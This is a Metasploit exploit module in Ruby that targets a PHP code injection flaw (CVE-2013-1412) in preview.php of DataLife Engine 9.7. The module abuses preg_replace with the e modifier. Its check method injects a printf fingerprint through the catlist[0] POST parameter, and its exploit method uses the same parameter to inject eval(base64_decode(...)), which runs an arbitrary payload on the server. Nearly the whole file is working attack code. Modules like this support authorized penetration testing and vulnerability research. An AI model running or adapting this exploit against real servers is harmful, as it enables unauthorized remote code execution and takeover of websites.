##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'DataLife Engine preview.php PHP Code Injection',
			'Description'    => %q{
					This module exploits a PHP code injection vulnerability DataLife Engine 9.7.
				The vulnerability exists in preview.php, due to an insecure usage of preg_replace()
				with the e modifier, which allows to inject arbitrary php code, when the template
				in use contains a [catlist] or [not-catlist] tag.
			},
			'Author'         =>
				[
					'EgiX', # Vulnerability discovery
					'juan vazquez' # Metasploit module
				],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					[ 'CVE', '2013-1412' ],
					[ 'BID', '57603' ],
					[ 'EDB', '24438' ],
					[ 'URL', 'http://karmainsecurity.com/KIS-2013-01' ],
					[ 'URL', 'http://dleviet.com/dle/bug-fix/3281-security-patches-for-dle-97.html' ]
				],
			'Privileged'     => false,
			'Platform'       => ['php'],
			'Arch'           => ARCH_PHP,
			'Payload'        =>
				{
					'Keys'   => ['php']
				},
			'DisclosureDate' => 'Jan 28 2013',
			'Targets'        => [ ['DataLife Engine 9.7', { }], ],
			'DefaultTarget'  => 0
			))

		register_options(
			[
				OptString.new('TARGETURI', [ true, "The base path to the web application", "/"])
			], self.class)
	end

	def base
		base = normalize_uri(target_uri.path)
		base << '/' if base[-1, 1] != '/'
		return base
	end

	def check
		fingerprint = rand_text_alpha(4+rand(4))
		res = send_request_cgi(
			{
				'uri'       =>  "#{base}engine/preview.php",
				'method'    => 'POST',
				'vars_post' =>
					{
						'catlist[0]' => "#{rand_text_alpha(4+rand(4))}')||printf(\"#{fingerprint}\");//"
					}
			})

		if res and res.code == 200 and res.body =~ /#{fingerprint}/
			return Exploit::CheckCode::Vulnerable
		else
			return Exploit::CheckCode::Safe
		end
	end

	def exploit
		@peer = "#{rhost}:#{rport}"

		print_status("#{@peer} - Exploiting the preg_replace() to execute PHP code")
		res = send_request_cgi(
			{
				'uri'       =>  "#{base}engine/preview.php",
				'method'    => 'POST',
				'vars_post' =>
					{
						'catlist[0]' => "#{rand_text_alpha(4+rand(4))}')||eval(base64_decode(\"#{Rex::Text.encode_base64(payload.encoded)}\"));//"
					}
			})
	end
end

